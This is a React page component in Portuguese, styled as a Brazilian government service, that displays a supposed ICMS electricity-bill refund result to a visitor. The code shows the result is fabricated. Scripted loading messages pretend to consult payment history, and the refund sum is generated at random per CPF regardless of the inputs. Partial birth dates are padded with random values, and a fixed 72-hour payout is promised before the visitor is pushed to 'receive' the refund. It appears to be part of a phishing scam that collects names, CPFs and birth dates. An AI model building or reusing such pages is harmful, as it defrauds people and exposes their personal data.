import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Button } from "@/components/ui/button";
import { Coins, User, Building, MapPin, ChevronRight, Calendar, Clock, CheckCircle, AlertCircle, Loader2 } from "lucide-react";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Progress } from "@/components/ui/progress";
import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { useUserData } from "@/contexts/UserContext";

export default function ResultadoCalculo() {
  // Hook de navegação do wouter
  const [location, navigate] = useLocation();
  
  // Obter dados do contexto do usuário
  const { userData, updateUserData } = useUserData();
  
  // Estado para controlar loading e progresso
  const [isLoading, setIsLoading] = useState(true);
  const [progresso, setProgresso] = useState(10);
  const [mensagemLoading, setMensagemLoading] = useState("Verificando seus dados...");
  
  // Estados para dados do resultado
  const [valorRestituicao, setValorRestituicao] = useState(0);
  const [dataPrevista, setDataPrevista] = useState("");
  
  // Obter dados do usuário do contexto global
  const nome = userData.nome || "";
  const cpf = userData.cpf || "";  // O CPF é a única fonte para determinar o valor da restituição
  const companhia = userData.companhia || "";
  const estado = userData.estado || "";
  const dataNascimento = userData.dataNascimento || "";
  
  // IMPORTANTE: Esses valores não afetam o cálculo da restituição
  // A restituição é determinada apenas pelo CPF e sempre será a mesma para um mesmo CPF
  const valorMedio = userData.valorConta?.toString() || "";
  const meses = userData.periodo?.toString() || "";
  
  // Sequência de mensagens a serem exibidas durante o loading
  const mensagens = [
    "Verificando seus dados...",
    "Consultando histórico de pagamentos...",
    "Calculando valor da restituição...",
    "Analisando percentuais de ICMS...",
    "Finalizando seu cálculo...",
    "Resultado encontrado!"
  ];
  
  useEffect(() => {
    // Iniciar animação de loading imediatamente
    setIsLoading(true);
    
    // Verificar se temos os dados necessários no contexto
    if (!cpf) {
      navigate("/verificar");
      return;
    }
    
    // Definir a data prevista com 72h úteis (3 dias úteis)
    setDataPrevista(calcularDataPrevisao());
    
    // Função para executar as mensagens de loading sequencialmente
    const exibirMensagensSequenciais = () => {
      let indiceAtual = 0;
      
      const intervalId = setInterval(() => {
        if (indiceAtual < mensagens.length - 1) {
          setMensagemLoading(mensagens[indiceAtual]);
          setProgresso((indiceAtual + 1) / mensagens.length * 100);
          indiceAtual++;
        } else {
          clearInterval(intervalId);
          
          // Última mensagem antes de mostrar o resultado
          setMensagemLoading(mensagens[mensagens.length - 1]);
          setProgresso(100);
          
          // Depois de um breve atraso, mostrar o resultado
          setTimeout(() => {
            setIsLoading(false);
          }, 1000);
        }
      }, 1000);
      
      return intervalId;
    };
    
    // Consultar API para obter valor de restituição (ou usar valor do contexto)
    const consultarValorRestituicao = async () => {
      try {
        // Se já temos valor no contexto, usar ele diretamente
        if (userData.valorRestituicao) {
          console.log("Usando valor de restituição do contexto:", userData.valorRestituicao);
          const valorEmCentavos = Math.round(parseFloat(userData.valorRestituicao.toString()) * 100);
          setValorRestituicao(valorEmCentavos);
          return;
        }
        
        // Limpar numeração do CPF
        const cpfLimpo = cpf.replace(/\D/g, '');
        
        // Consultar API
        const response = await fetch(`/api/restituicao?cpf=${cpfLimpo}`);
        const data = await response.json();
        
        if (data.encontrado && data.valorRestituicao) {
          // Usar o valor existente
          console.log("Valor encontrado no banco de dados:", data.valorRestituicao);
          const valorEmCentavos = Math.round(parseFloat(data.valorRestituicao) * 100);
          setValorRestituicao(valorEmCentavos);
          
          // Atualizar o contexto com o valor
          updateUserData({
            valorRestituicao: data.valorRestituicao
          });
        } else {
          // Usar valor do contexto ou gerar um novo
          const valorRestituicaoExistente = userData.valorRestituicao;
          
          if (valorRestituicaoExistente) {
            const valorEmCentavos = Math.round(parseFloat(valorRestituicaoExistente.toString()) * 100);
            setValorRestituicao(valorEmCentavos);
          } else {
            // Gerar um valor aleatório e verificar se foi salvo corretamente
            try {
              // Primeiro, tentamos criar o valor no backend
              console.log("Enviando solicitação para gerar valor aleatório para o CPF:", cpfLimpo);
              
              await fetch('/api/restituicao', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                  cpf: cpfLimpo,
                  valor: 0 // O backend vai gerar um valor aleatório se não existir
                }),
              });
              
              // Depois, consultamos o valor que foi gerado
              console.log("Consultando valor gerado para o CPF:", cpfLimpo);
              const response = await fetch(`/api/restituicao?cpf=${cpfLimpo}`);
              const data = await response.json();
              
              if (data.encontrado && data.valorRestituicao) {
                console.log("Valor encontrado/gerado pelo backend:", data.valorRestituicao);
                const valorEmCentavos = Math.round(parseFloat(data.valorRestituicao) * 100);
                setValorRestituicao(valorEmCentavos);
                
                // Atualizar o contexto com o valor
                updateUserData({
                  valorRestituicao: data.valorRestituicao
                });
              } else {
                throw new Error("Valor não foi gerado pelo backend");
              }
            } catch (error) {
              console.error("Erro ao gerar valor aleatório:", error);
              
              // Em caso de falha, usamos um valor padrão (valor médio)
              const valorPadrao = 2700.00;
              
              setValorRestituicao(Math.round(valorPadrao * 100));
              
              // Atualizar o contexto com o valor
              updateUserData({
                valorRestituicao: valorPadrao
              });
            }
          }
        }
      } catch (error) {
        console.error("Erro ao consultar/gerar valor de restituição:", error);
        
        // Em caso de erro, usar um valor padrão ou o do contexto
        if (userData.valorRestituicao) {
          const valorEmCentavos = Math.round(parseFloat(userData.valorRestituicao.toString()) * 100);
          setValorRestituicao(valorEmCentavos);
        } else {
          const valorPadrao = 250000; // R$ 2.500,00
          setValorRestituicao(valorPadrao);
          // Atualizar contexto
          updateUserData({
            valorRestituicao: valorPadrao / 100
          });
        }
      }
    };
    
    // Iniciar exibição das mensagens
    const intervalId = exibirMensagensSequenciais();
    
    // Consultar valor de restituição em paralelo
    consultarValorRestituicao();
    
    // Limpar intervalo quando o componente for desmontado
    return () => clearInterval(intervalId);
  }, [cpf, userData, updateUserData, navigate]);
  
  // Formatar CPF
  const formatarCPF = (cpf: string) => {
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
  };
  
  // Formatar valor monetário com separador de milhar
  const formatarMoeda = (valor: number) => {
    // Converter para valor formatado com separador de milhar e vírgula como decimal
    const valorEmReais = (valor / 100).toFixed(2);
    const partes = valorEmReais.split('.');
    
    // Adicionar separador de milhar
    partes[0] = partes[0].replace(/\B(?=(\d{3})+(?!\d))/g, ".");
    
    return `R$ ${partes.join(',')}`;
  };
  
  // Formatar data
  const formatarData = (data: string) => {
    // Verificar se a data é válida
    if (!data) return "";
    
    // Remover qualquer undefined da string
    const dataLimpa = data.replace(/undefined/g, "");
    
    // Se depois de limpar não sobrou nada útil
    if (!dataLimpa || dataLimpa.trim() === "/" || dataLimpa.trim() === "//") return "";
    
    try {
      // Apenas exibe a data como foi recebida se for no formato YYYY (não converte mais para 01/01/YYYY)
      if (/^\d{4}$/.test(dataLimpa)) {
        const dataGerada = `${Math.floor(Math.random() * 28) + 1}/${Math.floor(Math.random() * 12) + 1}/${dataLimpa}`;
        return dataGerada;
      }
      
      // Tentar formatar se tiver o formato YYYY-MM-DD
      if (dataLimpa.includes("-") && dataLimpa.length >= 10) {
        const [ano, mes, dia] = dataLimpa.substring(0, 10).split('-');
        if (ano && mes && dia) {
          return `${dia}/${mes}/${ano}`;
        }
      }
      
      // Se já estiver no formato DD/MM/YYYY, retornar como está
      if (/^\d{2}\/\d{2}\/\d{4}$/.test(dataLimpa)) {
        return dataLimpa;
      }
      
      // Se for uma data com formato desconhecido, tenta converter
      const dataObj = new Date(dataLimpa);
      if (!isNaN(dataObj.getTime())) {
        return `${String(dataObj.getDate()).padStart(2, '0')}/${String(dataObj.getMonth() + 1).padStart(2, '0')}/${dataObj.getFullYear()}`;
      }
      
      // Se não conseguir formatar, retornar a data limpa
      return dataLimpa;
    } catch {
      // Em caso de erro, retornar string vazia
      return "";
    }
  };
  
  // Função para calcular a data de previsão - exatamente 72 horas (3 dias) a partir da data/hora atual
  const calcularDataPrevisao = () => {
    const hoje = new Date();
    
    // Adicionar exatamente 72 horas (3 dias)
    const dataFutura = new Date(hoje.getTime() + (72 * 60 * 60 * 1000));
    
    const dia = dataFutura.getDate().toString().padStart(2, '0');
    const mes = (dataFutura.getMonth() + 1).toString().padStart(2, '0');
    const ano = dataFutura.getFullYear();
    
    return `${dia}/${mes}/${ano}`;
  };
  
  // Redirecionar para a página de confirmação de forma mais rápida
  const prosseguirParaConfirmacao = () => {
    // Atualizar contexto com a data prevista antes de navegar
    updateUserData({
      dataPrevista: dataPrevista
    });
    
    // Verificar no console os dados que serão passados para a próxima página
    console.log("Dados do usuário que serão passados para confirmação:", {
      cpf,
      nome,
      valorRestituicao,
      companhia,
      estado,
      dataNascimento,
      meses,
      dataPrevista
    });
    
    // Navegar diretamente para a página de confirmação sem parâmetros na URL
    navigate("/confirmacao-restituicao");
  };
  
  return (
    <div className="min-h-screen flex flex-col">
      <Header />
      
      {isLoading ? (
        // Tela de loading - Idêntica à usada na página Resultado
        <main className="flex-1 bg-[#f0f2f5] py-8">
          <div className="container mx-auto px-4">
            <div className="max-w-4xl mx-auto">
              <Card className="shadow-md">
                <CardHeader className="bg-[var(--gov-blue)] text-white text-center py-6">
                  <CardTitle className="text-2xl font-bold">Cálculo da Restituição</CardTitle>
                  <CardDescription className="text-gray-100 mt-2">
                    Estamos processando os dados para calcular sua restituição
                  </CardDescription>
                </CardHeader>
                
                <CardContent className="p-6">
                  <div className="text-center py-8">
                    <h3 className="text-lg font-semibold mb-4 text-[var(--gov-blue-dark)]">
                      Verificando seus dados...
                    </h3>
                    <Progress value={progresso} className="h-2 mb-4" />
                    <p className="text-sm text-[var(--gov-gray-dark)] mb-4">
                      Estamos consultando suas informações para verificar o direito à restituição.
                    </p>
                    <p className="text-sm text-[var(--gov-blue-dark)] font-medium animate-pulse">
                      {mensagemLoading}
                    </p>
                  </div>
                </CardContent>
              </Card>
            </div>
          </div>
        </main>
      ) : (
        // Resultado do cálculo após o loading
        <main className="flex-1 container max-w-5xl mx-auto px-4 py-8">
          <div className="grid grid-cols-1 md:grid-cols-[2fr_1fr] gap-6">
            <div className="space-y-6">
              <h1 className="text-2xl md:text-3xl font-bold text-[var(--gov-blue-dark)]">
                Resultado do Cálculo de Restituição
              </h1>
              
              <Card className="overflow-hidden">
                <div className="bg-gradient-to-b from-green-50 to-green-100 p-5 border-b border-green-200 rounded-t-md">
                  <div className="flex items-center justify-center mb-2">
                    <div className="bg-green-100 p-2 rounded-full border border-green-200">
                      <CheckCircle className="text-green-600 h-6 w-6" />
                    </div>
                  </div>

                  <h3 className="font-bold text-green-800 text-xl mb-1 text-center">
                    Restituição Disponível!
                  </h3>
                  
                  <div className="h-0.5 w-24 bg-green-200 mx-auto my-2"></div>
                  
                  <h2 className="text-lg font-semibold text-[var(--gov-blue-dark)] text-center mb-3">
                    Valor disponível para Restituição
                  </h2>
                  
                  <div className="bg-white p-4 rounded-md shadow-sm border border-green-200 mb-2 flex flex-col items-center">
                    <div className="flex items-center justify-center">
                      <Coins className="h-8 w-8 text-green-600 mr-2" />
                      <span className="text-3xl font-bold text-green-600">
                        {formatarMoeda(valorRestituicao)}
                      </span>
                    </div>
                    
                    {/* Texto explicativo sobre o valor da restituição baseado no período */}
                    <p className="text-xs text-[var(--gov-gray-dark)] mt-2 text-center">
                      Valor de restituição baseado no período selecionado:
                      {meses <= 12 && <span className="font-semibold"> R$ 1.977,90 (1 a 11 meses)</span>}
                      {meses > 12 && meses <= 36 && <span className="font-semibold"> R$ 2.897,30 (1 a 3 anos)</span>}
                      {meses > 36 && <span className="font-semibold"> R$ 3.221,16 (4 a 5 anos)</span>}
                    </p>
                  </div>
                </div>
                
                <CardContent className="p-6 space-y-4">
                  <h3 className="text-lg font-semibold text-[var(--gov-blue-dark)]">
                    Dados do Solicitante
                  </h3>
                  
                  <div className="grid grid-cols-1 gap-4">
                    <div className="flex items-start space-x-3">
                      <User className="h-5 w-5 text-[var(--gov-blue)] mt-0.5" />
                      <div>
                        <p className="text-sm text-[var(--gov-gray-dark)]">Nome Completo</p>
                        <p className="font-medium">{nome}</p>
                      </div>
                    </div>
                    
                    <div className="flex items-start space-x-3">
                      <div className="h-5 w-5 flex items-center justify-center text-[var(--gov-blue)] mt-0.5">
                        <span className="text-xs font-bold">CPF</span>
                      </div>
                      <div>
                        <p className="text-sm text-[var(--gov-gray-dark)]">CPF</p>
                        <p className="font-medium">{formatarCPF(cpf)}</p>
                      </div>
                    </div>
                    
                    <div className="flex items-start space-x-3">
                      <Calendar className="h-5 w-5 text-[var(--gov-blue)] mt-0.5" />
                      <div>
                        <p className="text-sm text-[var(--gov-gray-dark)]">Data de Nascimento</p>
                        <p className="font-medium">{formatarData(dataNascimento)}</p>
                      </div>
                    </div>
                    
                    <div className="flex items-start space-x-3">
                      <Building className="h-5 w-5 text-[var(--gov-blue)] mt-0.5" />
                      <div>
                        <p className="text-sm text-[var(--gov-gray-dark)]">Companhia Elétrica</p>
                        <p className="font-medium">{companhia}</p>
                      </div>
                    </div>
                    
                    <div className="flex items-start space-x-3">
                      <MapPin className="h-5 w-5 text-[var(--gov-blue)] mt-0.5" />
                      <div>
                        <p className="text-sm text-[var(--gov-gray-dark)]">Estado</p>
                        <p className="font-medium">{estado}</p>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
            
            <div className="space-y-6">
              <Card>
                <CardContent className="p-6 space-y-4">
                  <h3 className="text-lg font-semibold text-[var(--gov-blue-dark)]">
                    Informações do Processo
                  </h3>
                  
                  <div className="flex items-start space-x-3 border-b border-gray-100 pb-3">
                    <Clock className="h-5 w-5 text-[var(--gov-blue)] mt-0.5" />
                    <div>
                      <p className="text-sm text-[var(--gov-gray-dark)]">Previsão para Recebimento</p>
                      <p className="font-medium">{dataPrevista}</p>
                    </div>
                  </div>
                  
                  <div className="flex items-start space-x-3 border-b border-gray-100 pb-3">
                    <AlertCircle className="h-5 w-5 text-amber-500 mt-0.5" />
                    <div>
                      <p className="text-sm text-[var(--gov-gray-dark)]">Status do Processo</p>
                      <p className="font-medium text-amber-600">Pendente</p>
                    </div>
                  </div>
                  
                  <Button 
                    onClick={prosseguirParaConfirmacao}
                    className="w-full bg-[var(--gov-blue)] hover:bg-[var(--gov-blue)]/90 mt-4 text-white font-bold py-3"
                  >
                    RECEBER MINHA RESTITUIÇÃO
                    <ChevronRight className="ml-2 h-4 w-4" />
                  </Button>
                </CardContent>
              </Card>
              
              <div id="info-area"></div>
            </div>
          </div>
        </main>
      )}
      
      <Footer />
    </div>
  );
}